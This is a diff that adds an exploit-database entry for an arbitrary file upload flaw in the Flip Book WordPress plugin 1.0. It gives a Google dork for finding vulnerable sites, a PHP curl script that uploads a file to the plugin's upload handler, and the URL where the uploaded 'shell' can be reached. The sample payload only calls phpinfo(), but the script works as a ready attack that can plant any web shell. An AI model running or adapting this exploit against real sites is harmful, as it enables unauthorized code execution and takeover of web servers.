@@ -1,0 +1,64 @@
+source: http://www.securityfocus.com/bid/54173/info
+
+Flip Book is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.
+
+An attacker can exploit this vulnerability to upload arbitrary code and execute it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.
+
+Flip Book 1.0 is vulnerable; other versions may also be affected. 
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : 1337day.com                                   0
+1  [+] Support e-mail  : submit[at]1337day.com                         1
+0                                                                      0
+1               #########################################              1
+0               I'm Sammy FORGIT member from Inj3ct0r Team             1
+1               #########################################              0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+##################################################
+# Description : Wordpress Plugins - Flip Book Arbitrary File Upload Vulnerability
+# Version : 1.0
+# link : http://codecanyon.net/item/flip-book-wordpress-plugin/152641
+# Price : 30$
+# Date : 22-06-2012
+# Google Dork : inurl:/wp-content/plugins/flipbook/
+# Site : 1337day.com Inj3ct0r Exploit Database
+# Author : Sammy FORGIT - sam at opensyscom dot fr - http://www.opensyscom.fr
+##################################################
+
+
+Exploit :
+
+<?php
+
+$uploadfile="lo.php";
+
+$ch = curl_init("http://www.exemple.com/wordpress/wp-content/plugins/flipbook/php.php");
+curl_setopt($ch, CURLOPT_POST, true);   
+curl_setopt($ch, CURLOPT_POSTFIELDS, array('qqfile'=>"@$uploadfile"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+   
+print "$postResult";
+
+?>
+
+Shell Access : http://www.exemple.com/wordpress/wp-includes/fb-images/lo.php
+
+lo.php
+<?php
+phpinfo();
+?>
+
+
+# Site : 1337day.com Inj3ct0r Exploit Database
